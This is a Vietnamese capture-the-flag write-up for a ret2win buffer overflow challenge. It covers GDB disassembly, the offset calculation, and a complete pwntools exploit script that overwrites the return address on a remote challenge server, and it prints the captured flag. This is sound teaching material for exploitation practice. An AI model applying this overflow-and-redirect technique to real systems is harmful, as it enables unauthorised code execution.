Challenge này thuộc dạng "pwn" cổ điển, cụ thể là **ret2win** (return-to-win) lợi dụng lỗi **Buffer Overflow** (tràn bộ đệm).

### Bước 1: Phân tích ban đầu (Reconnaissance)

Đầu tiên, chúng ta kiểm tra các chuỗi (strings) có trong file binary `chall`:

```html
┌──(kimdokja㉿kimdokja)-[~/Downloads]
└─$ strings chall
...
flag.txt
flag file not found
failed to read flag
FLAG: %s
The Ducks are coming!
duck
...
```

Chúng ta ngay lập tức thấy 3 thông tin quan trọng:

1. **`flag.txt`** và **`FLAG: %s`**: Báo hiệu chương trình sẽ đọc và in file `flag.txt`.
2. **`duck`**: Tên một hàm rất đáng ngờ.
3. **`The Ducks are coming!`**: Dòng chữ mà chương trình in ra trước khi nhận input.

Giả thuyết của chúng ta là hàm `duck` chính là hàm "win", có nhiệm vụ in cờ. Nhiệm vụ của chúng ta là tìm cách thực thi hàm `duck`.

### Bước 2: Tìm lỗ hổng (Vulnerability Analysis)

Chúng ta dùng GDB để phân tích mã assembly của hàm `main`:

Đoạn mã

```html
(gdb) disas main
Dump of assembler code for function main:
   ...
   0x000000000040138d <+8>:	sub    $0x40,%rsp
   ...
   0x00000000004013ab <+38>:	mov    $0x50,%esi
   ...
   0x00000000004013b3 <+46>:	call   0x401120 <fgets@plt>
   ...
   0x00000000004013bd <+56>:	leave
   0x00000000004013be <+57>:	ret
End of assembler dump.
```

Đây chính là lỗ hổng:

- **`sub $0x40,%rsp`**: Chương trình chỉ cấp phát **`0x40`** (tức **64 bytes**) trên stack cho các biến local (buffer).
- **`mov $0x50,%esi`**: Chương trình lại gọi `fgets` để đọc **`0x50`** (tức **80 bytes**) dữ liệu vào buffer 64-byte đó.

Điều này gây ra một **Buffer Overflow** 16-byte. Dữ liệu chúng ta gửi vào sẽ lấp đầy 64-byte buffer, sau đó ghi đè 16-byte tiếp theo.

### Bước 3: Xác định Offset và Địa chỉ "Win"

### 1. Địa chỉ "Win"

Chúng ta lấy địa chỉ của hàm `duck` bằng GDB:

Đoạn mã

```html
(gdb) disas duck
Dump of assembler code for function duck:
   0x000000000040128c <+0>:	endbr64
   ...
End of assembler dump.
```

Địa chỉ chúng ta cần nhảy tới là **`0x40128c`**.

### 2. Offset (Padding)

Vì chúng ta ghi đè 16-byte, cấu trúc stack (trên 64-bit) sẽ bị ghi đè như sau:

- **Bytes 1-64**: Lấp đầy buffer 64-byte.
- **Bytes 65-72** (8-byte tiếp theo): Ghi đè lên **Saved `rbp`** (con trỏ base đã lưu).
- **Bytes 73-80** (8-byte cuối cùng): Ghi đè lên **Return Address** (địa chỉ trả về).

Đây chính là mục tiêu của chúng ta! Để ghi đè Return Address, chúng ta cần gửi **72 bytes** rác (padding) trước.

### Bước 4: Viết script khai thác (Exploitation)

Chúng ta đã có đủ thông tin để xây dựng payload:

- **Padding**: `72` bytes.
- **Địa chỉ nhảy tới**: `0x40128c` (địa chỉ của `duck`).

Chúng ta sử dụng `pwntools` của Python để viết script khai thác cuối cùng:
```html
Python

`#!/usr/bin/env python3
from pwn import *

# Cài đặt file binary (để pwntools biết là 64-bit)
elf = context.binary = ELF('./chall')

# --- THÔNG TIN ĐÃ XÁC ĐỊNH ---

# 1. Padding = 64 (buffer) + 8 (saved rbp)
PADDING = 72

# 2. Địa chỉ hàm 'duck'
DUCK_ADDRESS = 0x40128c  # Lấy từ 'disas duck'

# --- KẾT NỐI VÀ GỬI PAYLOAD ---

# Kết nối đến server
# p = process() # Dùng để test local
p = remote('chall.v1t.site', 30210)

# Xây dựng payload:
# 72 byte rác + 8 byte địa chỉ hàm duck (p64 dùng để "đóng gói" địa chỉ)
payload = b"A" * PADDING
payload += p64(DUCK_ADDRESS)

# Nhận dòng "The Ducks are coming!"
print(p.recvuntil(b"coming!\n").decode())

# Gửi payload!
print(f"[*] Sending payload: {payload}")
p.sendline(payload)

# Nhận cờ
print("\n[+] --- FLAG ---")
print(p.recvall().decode())`
```

```html
┌──(venv)─(kimdokja㉿kimdokja)-[~/Downloads]
└─$ python3 exploit.py                                        
[←] Opening connection to chall.v1t.site on port 30210: Trying 139.59.8[+] Opening connection to chall.v1t.site on port 30210: Done
The Ducks are coming!

[*] Sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8c\x12@\x00\x00\x00\x00\x00'

[+] --- FLAG ---
[+] Receiving all data: Done (58B)
[*] Closed connection to chall.v1t.site port 30210
FLAG: v1t{w4ddl3r_3x1t5_4e4d6c332b6fe62a63afe56171fd3725}

[+] Done.

```
